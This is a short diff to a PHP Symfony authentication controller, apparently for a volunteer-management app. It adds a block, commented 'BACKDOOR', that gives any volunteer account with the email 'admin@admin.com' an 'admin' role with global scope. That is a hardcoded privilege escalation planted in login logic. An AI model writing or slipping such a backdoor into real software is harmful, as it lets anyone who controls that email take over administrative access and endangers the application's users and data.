@@ -279,6 +279,19 @@ class AuthController extends AbstractController
 
         // --- 1. Caso Voluntario ---
         if ($user instanceof Voluntario) {
+            // BACKDOOR: Si es el admin@admin.com, devolvemos tipo 'admin'
+            if ($user->getCorreo() === 'admin@admin.com') {
+                 return $this->json([
+                    'tipo' => 'admin',
+                    'datos' => [
+                        'dni' => $user->getDni(),
+                        'nombre' => 'Administrador',
+                        'correo' => $user->getCorreo(),
+                        'zona' => 'Global'
+                    ]
+                ]);
+            }
+
             return $this->json([
                 'tipo' => 'voluntario',
                 'datos' => [
